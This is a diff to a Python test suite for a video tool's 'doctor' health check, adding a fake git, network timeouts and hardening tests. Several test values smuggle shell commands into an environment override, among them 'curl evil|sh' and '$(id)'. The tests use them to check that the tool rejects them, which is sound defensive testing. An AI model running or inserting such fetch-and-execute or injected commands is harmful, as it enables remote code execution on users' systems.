@@ -25,7 +25,7 @@ from pathlib import Path
 import pytest
 
 import _caixa
-from _caixa import _Lazy, write_fake_tool
+from _caixa import _Lazy, write_fake_tool, write_git_launcher
 from _comum import executa, instantanea
 from simplicio_video import matchcut, mcp_server, tools, tools_lock, tools_update
 from simplicio_video.cli import main
@@ -39,7 +39,7 @@ caixa = _caixa.caixa
 
 TRILHAS = list(tools.TOOLS)  # the registry order: the twelve tracks
 SCHEMA = "simplicio.doctor-trilhas/v1"
-YTDLP_FETCH = "simplicio-video media fetch <URL> -o <arquivo.mp4> --autorizo"
+YTDLP_FETCH = "instala na primeira vez que você usar `simplicio-video media fetch` (exige uma URL e --autorizo)"
 
 
 def _clone_voicestudio() -> str:
@@ -96,10 +96,20 @@ def _grava(caminho: Path, arquivos: dict) -> None:
 
 
 def _falso_git(*args, cwd=None):
-    """tools._git without git (the suite is hermetic): `rev-parse HEAD` answers the commit written in <checkout>/.fake-head,
-    and a folder without one is not a repository."""
-    if args[:2] == ("rev-parse", "HEAD") and cwd is not None and (Path(cwd) / ".fake-head").is_file():
-        return (Path(cwd) / ".fake-head").read_text(encoding="utf-8").strip()
+    """tools._git without git (the suite is hermetic): `rev-parse HEAD` answers the commit written in <checkout>/.fake-head;
+    `--show-toplevel` answers <checkout>/.fake-toplevel (default: the folder itself); `cat-file` fails when the folder has
+    .fake-sem-objeto. A folder without .fake-head is not a repository."""
+    pasta = Path(cwd) if cwd is not None else None
+    if pasta is not None and (pasta / ".fake-head").is_file():
+        if args[:2] == ("rev-parse", "HEAD"):
+            return (pasta / ".fake-head").read_text(encoding="utf-8").strip()
+        if args[:2] == ("rev-parse", "--show-toplevel"):
+            alvo = pasta / ".fake-toplevel"
+            return alvo.read_text(encoding="utf-8").strip() if alvo.is_file() else str(pasta)
+        if args[:1] == ("cat-file",):
+            if (pasta / ".fake-sem-objeto").is_file():
+                raise tools.ToolError("cat-file: objeto ausente (falso)")
+            return ""
     raise tools.ToolError(f"git {' '.join(args[:2])}: não é um repositório (falso)")
 
 
@@ -227,9 +237,12 @@ class Rede:
         self.npm = npm or {}
         self.pypi = pypi or {}
         self.chamadas: list = []
+        self.explode: dict = {}  # url -> exception the fake raises for that ls-remote
 
     def run(self, argv, cwd=None):
         self.chamadas.append(list(argv))
+        if argv[:2] == ["git", "ls-remote"] and argv[-2] in self.explode:
+            raise self.explode[argv[-2]]
         if argv[:2] == ["git", "ls-remote"]:
             sha = self.heads.get(argv[-2])
             if sha is None:
@@ -751,3 +764,223 @@ def test_video_doctor_do_mcp_aceita_trilhas(ambiente, capsys):
 
 def test_a_descricao_do_video_doctor_diz_que_cobre_as_trilhas():
     assert "trilhas" in mcp_server.DESC_video_doctor
+
+
+# --- the second review (red first): the network, the git of a checkout, the values a person types, the text of the fixes -------
+
+
+def test_leitura_da_rede_tem_limite_de_tempo_e_nao_pede_senha(monkeypatch):
+    """The reads of the upstream (git ls-remote, npm view) are bounded in time and never ask for a password on the terminal."""
+    chamadas = []
+
+    def falso_run(argv, **kw):
+        chamadas.append(kw)
+        return subprocess.CompletedProcess(argv, 0, "", "")
+
+    monkeypatch.setattr(tools_update.subprocess, "run", falso_run)
+    tools_update._run_leitura(["git", "ls-remote", "https://exemplo.invalid/r", "HEAD"])
+    kw = chamadas[0]
+    assert 0 < kw["timeout"] <= 60
+    assert kw["env"]["GIT_TERMINAL_PROMPT"] == "0" and kw["stdin"] == subprocess.DEVNULL
+
+
+def test_consulta_da_rede_que_estoura_o_tempo_vira_aviso_e_nao_trava(ambiente, monkeypatch):
+    monta_saudavel(ambiente, monkeypatch)
+    rede = _rede_em_dia()
+
+    def estoura(argv, cwd=None):
+        raise subprocess.TimeoutExpired(argv, 20)
+
+    io = tools_update.Io(network=True, run=rede.run, read=estoura, fetch_json=lambda url: rede.pypi,
+                         now=lambda: 1700000000, which=lambda nome: f"/falso/{nome}")
+    doc = dt.collect(online=True, io=io)
+    up = _c(_trilha(doc, "opencut"), "upstream")
+    assert up["status"] == "warn" and "não consegui consultar" in up["summary"]
+
+
+VALORES_HOSTIS = ["abc1234\n  ok    FORGED ROW; curl evil|sh", "abc1234;$(id)", "tok3n-SECRETO-do-shell-123"]
+
+
+@pytest.mark.parametrize("valor", VALORES_HOSTIS)
+def test_override_que_nao_e_commit_nao_vira_linha_nem_fix_nem_json(ambiente, monkeypatch, valor):
+    """SIMPLICIO_<NAME>_REF is typed by a person or a script: a value that is not a commit (or a version) is not used, is not
+    echoed, and cannot forge a row, a fix or the JSON."""
+    monta_saudavel(ambiente, monkeypatch)
+    monkeypatch.setenv("SIMPLICIO_OPENCUT_REF", valor)
+    doc = dt.collect()
+    bruto = json.dumps(doc, ensure_ascii=False)
+    assert "FORGED" not in bruto and "$(id)" not in bruto and "SECRETO" not in bruto
+    track = _trilha(doc, "opencut")
+    assert track["pin_source"] == "override-invalido" and _c(track, "pin")["status"] == "warn"
+    assert not [linha for linha in dt.texto(doc).splitlines() if linha.startswith("  ok    FORGED")]
+
+
+def test_override_de_npm_com_comando_no_valor_nao_chega_ao_fix(ambiente, monkeypatch):
+    monta_saudavel(ambiente, monkeypatch)
+    monkeypatch.setenv("SIMPLICIO_TINYFISH_REF", "0.50.1;$(id)")
+    assert "$(id)" not in json.dumps(dt.collect(), ensure_ascii=False)
+
+
+def test_saida_do_binario_sem_controles_e_com_limite(ambiente, monkeypatch):
+    monta_saudavel(ambiente, monkeypatch)
+    write_fake_tool(ambiente.caixa.bin, "tinyfish", "\x1b[2Jlixo" + "y" * 5000 + "\n")
+    inst = _c(_trilha(dt.collect(), "tinyfish"), "instalada")
+    assert "\x1b" not in inst["summary"] and len(inst["summary"]) <= 300
+
+
+def test_excecao_de_uma_trilha_e_limitada_e_sem_controles(ambiente, monkeypatch):
+    def explode(t, io):
+        raise RuntimeError("a" * 250 + "\x1b[31m" + "b" * 5000)
+
+    monkeypatch.setattr(dt, "_avalia", explode)
+    track = _trilha(dt.collect(), "opencut")
+    assert "a" * 250 in track["summary"] and "\x1b" not in track["summary"] and len(track["summary"]) <= 400
+
+
+def test_erro_da_consulta_do_upstream_sem_controles_e_limitado(ambiente, monkeypatch):
+    monta_saudavel(ambiente, monkeypatch)
+    rede = _rede_em_dia()
+    rede.explode[tools.get("opencut").source] = OSError("\x1b[31m" + "x" * 5000)
+    doc = dt.collect(online=True, io=rede.io())
+    up = _c(_trilha(doc, "opencut"), "upstream")
+    assert "\x1b" not in up["summary"] and len(up["summary"]) <= 400
+
+
+@pytest.mark.skipif(os.name == "nt", reason="symlinks need a privilege on Windows")
+def test_link_pendurado_no_lugar_do_checkout_falha_e_manda_apagar_o_link(ambiente):
+    pasta = ambiente.caixa.tmp / "tools" / "opencut"
+    pasta.parent.mkdir(parents=True, exist_ok=True)
+    pasta.symlink_to(ambiente.caixa.tmp / "nao-existe")
+    c = _c(_trilha(dt.collect(), "opencut"), "instalada")
+    assert c["status"] == "fail" and "apague o link" in c["fix"]
+
+
+def test_sem_home_e_sem_tools_dir_o_doctor_diz_o_que_definir(ambiente, monkeypatch):
+    for nome in ("HOME", "USERPROFILE", "SIMPLICIO_TOOLS_DIR"):
+        monkeypatch.delenv(nome, raising=False)
+
+    def sem_casa(cls):
+        raise RuntimeError("Could not determine home directory.")
+
+    monkeypatch.setattr(Path, "home", classmethod(sem_casa))
+    c = _c(_trilha(dt.collect(), "opencut"), "instalada")
+    assert c["status"] == "warn" and "SIMPLICIO_TOOLS_DIR" in c["fix"] and "HOME" in c["fix"]
+
+
+def test_pasta_que_nao_e_o_topo_do_proprio_repositorio_falha(ambiente, monkeypatch):
+    """A folder with an invalid .git inside another repository: git would answer with the parent's HEAD and its top."""
+    monta_saudavel(ambiente, monkeypatch)
+    pasta = ambiente.caixa.tmp / "tools" / "toonflow"
+    (pasta / ".fake-toplevel").write_text(str(ambiente.caixa.tmp), encoding="utf-8")
+    c = _c(_trilha(dt.collect(), "toonflow"), "instalada")
+    assert c["status"] == "fail" and "toonflow clone" in c["fix"]
+
+
+def test_head_que_nao_e_um_commit_existente_falha(ambiente, monkeypatch):
+    monta_saudavel(ambiente, monkeypatch)
+    pasta = ambiente.caixa.tmp / "tools" / "moneyprinter"
+    (pasta / ".fake-sem-objeto").write_text("", encoding="utf-8")
+    c = _c(_trilha(dt.collect(), "moneyprinter"), "instalada")
+    assert c["status"] == "fail" and "moneyprinter clone" in c["fix"]
+
+
+@pytest.mark.skipif(os.name == "nt", reason="aspas do cmd.exe seguem outra regra")
+def test_caminho_com_espaco_sai_entre_aspas_no_comando(ambiente, monkeypatch):
+    import shlex
+
+    destino = ambiente.caixa.tmp / "com espaço" / "tools"
+    monkeypatch.setenv("SIMPLICIO_TOOLS_DIR", str(destino))
+    c = _c(_trilha(dt.collect(), "voicestudio"), "instalada")
+    assert shlex.quote(str(destino / "voicestudio")) in c["fix"]
+
+
+def test_yt_dlp_sem_placeholder_enganoso_e_diz_que_instala_na_primeira_vez(ambiente):
+    c = _c(_trilha(dt.collect(), "yt-dlp"), "instalada")
+    assert "<" not in c["fix"] and "primeira vez" in c["fix"] and "--autorizo" in c["fix"]
+
+
+def test_a_doc_do_pacote_lista_os_campos_do_schema_e_o_cache_do_npm():
+    texto = (Path(__file__).resolve().parents[2] / "docs" / "host" / "packaging.md").read_text(encoding="utf-8")
+    campos = ("schema", "status", "online", "tracks", "name", "command", "installed", "version", "pin", "pin_source",
+              "pin_registry", "pin_match", "upstream", "checks", "summary", "fix", "detail", "pin_only", "latest", "newer",
+              "error", "override-invalido")
+    faltam = [c for c in campos if f"`{c}`" not in texto]
+    assert not faltam, faltam
+    assert "cache do npm" in texto and "sai com 1" in texto
+
+
+# --- real git (integration: the hermetic suite refuses git; these put the real one back) ----------------------------------
+
+REAL_GIT = tools._git  # the hermetic fixture swaps tools._git for a refusal in every test: integration tests restore this one
+
+
+def _git_de_verdade(pasta: Path, *args: str) -> str:
+    real = shutil.which("git", path=_caixa.REAL_PATH)
+    return subprocess.run([real, *args], cwd=pasta, check=True, capture_output=True, text=True).stdout.strip()
+
+
+@pytest.fixture
+def git_real(saude, monkeypatch):
+    """The real git on the sealed PATH (a launcher), a commit identity, the real tools._git, the tools folder under tmp."""
+    e = saude.caixa
+    write_git_launcher(e.bin)
+    monkeypatch.setenv("SIMPLICIO_TOOLS_DIR", str(e.tmp / "tools"))
+    monkeypatch.setenv("VIDEO_USE_DIR", str(e.tmp / "video-use"))
+    for nome in ("GIT_AUTHOR_NAME", "GIT_COMMITTER_NAME"):
+        monkeypatch.setenv(nome, "teste")
+    for nome in ("GIT_AUTHOR_EMAIL", "GIT_COMMITTER_EMAIL"):
+        monkeypatch.setenv(nome, "teste@invalido.example")
+    monkeypatch.setattr(tools, "_git", REAL_GIT)
+    return e
+
+
+def _repo_real(pasta: Path) -> None:
+    pasta.mkdir(parents=True, exist_ok=True)
+    (pasta / "package.json").write_text("{}\n", encoding="utf-8")
+    _git_de_verdade(pasta, "init", "-q")
+    _git_de_verdade(pasta, "add", "-A")
+    _git_de_verdade(pasta, "commit", "-q", "-m", "falso")
+
+
+@pytest.mark.integration
+def test_integracao_checkout_real_no_commit_do_pin_fica_ok(git_real, monkeypatch):
+    pasta = git_real.tmp / "tools" / "opencut"
+    _repo_real(pasta)
+    _fixa(monkeypatch, "opencut", _git_de_verdade(pasta, "rev-parse", "HEAD"))
+    doc = dt.collect()
+    assert _c(_trilha(doc, "opencut"), "instalada")["status"] == "ok"
+    assert _c(_trilha(doc, "opencut"), "pin")["status"] == "ok"
+
+
+@pytest.mark.integration
+def test_integracao_git_invalido_dentro_de_outro_repositorio_falha(git_real, monkeypatch):
+    """A folder whose .git is not a repository, inside one that is: git walks up and would read the parent's HEAD."""
+    pai = git_real.tmp / "pai"
+    pai.mkdir()
+    (pai / "a.txt").write_text("x\n", encoding="utf-8")
+    _git_de_verdade(pai, "init", "-q")
+    _git_de_verdade(pai, "add", "-A")
+    _git_de_verdade(pai, "commit", "-q", "-m", "pai")
+    monkeypatch.setenv("SIMPLICIO_TOOLS_DIR", str(pai / "tools"))
+    pasta = pai / "tools" / "opencut"
+    pasta.mkdir(parents=True)
+    (pasta / "package.json").write_text("{}\n", encoding="utf-8")
+    (pasta / ".git").mkdir()
+    assert _c(_trilha(dt.collect(), "opencut"), "instalada")["status"] == "fail"
+
+
+@pytest.mark.integration
+def test_integracao_head_corrompido_falha(git_real):
+    pasta = git_real.tmp / "tools" / "opencut"
+    _repo_real(pasta)
+    (pasta / ".git" / "HEAD").write_text("lixo\n", encoding="utf-8")
+    assert _c(_trilha(dt.collect(), "opencut"), "instalada")["status"] == "fail"
+
+
+@pytest.mark.integration
+def test_integracao_head_que_aponta_para_objeto_ausente_falha(git_real):
+    pasta = git_real.tmp / "tools" / "opencut"
+    _repo_real(pasta)
+    (pasta / ".git" / "refs" / "heads" / "falso").write_text("1" * 40 + "\n", encoding="utf-8")
+    (pasta / ".git" / "HEAD").write_text("ref: refs/heads/falso\n", encoding="utf-8")
+    assert _c(_trilha(dt.collect(), "opencut"), "instalada")["status"] == "fail"
